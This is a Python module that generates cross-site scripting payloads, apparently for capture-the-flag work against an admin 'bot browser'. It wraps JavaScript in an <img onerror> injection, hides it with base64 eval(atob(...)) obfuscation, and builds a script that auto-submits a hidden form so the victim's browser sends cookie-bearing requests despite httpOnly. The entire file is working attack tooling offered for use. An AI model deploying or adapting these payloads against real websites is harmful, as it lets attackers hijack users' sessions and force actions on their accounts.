from webtools.js import minify
import base64
import typing

context = {
    'whitespace': ' ',
}

def as_img(script: str, src: str = 'x'):
    script = minify(script)
    script = script.replace("'", "\\'")
    return f"<img{context['whitespace']}src={src}{context['whitespace']}onerror='{script}'/>"

def eval_base64(script: str):
    script_encoded = base64.b64encode(script.encode()).decode()
    return f"eval(atob('{script_encoded}'))"

def form_submit_script(url, form_data, method='POST'):
    """
    If httpOnly is enabled your fetch requests will not include cookies, to force the bot browser
    to do an action (including the cookies) you can force submit a form.
    """
    form_data = "\n".join([_form_input_to_append(form_input) for form_input in form_data])
    return f"""
const formData = new FormData();
{form_data}

const form = document.createElement('form');
form.method = '{method}';
form.action = '{url}'; 
form.enctype = 'multipart/form-data';

for (const [key, value] of formData.entries()) {{
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = key;
    input.value = value;
    form.appendChild(input);
}}

document.body.appendChild(form);
form.submit();
"""


def _form_input_to_append(input: typing.Tuple[str, str|bytes, str|None]):
    # if the input is a string
    if type(input[1]) == str:
        return f"formData.append('{input[0]}', '{input[1]}');"
    else:
        hex_array = ', '.join(f'0x{byte:02X}' for byte in input[1])
        return f"""
var binaryData = new Uint8Array([{hex_array}]);
var fileBlob = new Blob([binaryData], {{ type: 'application/octet-stream' }});
formData.append('{input[0]}', fileBlob, '{input[2]}');
        """

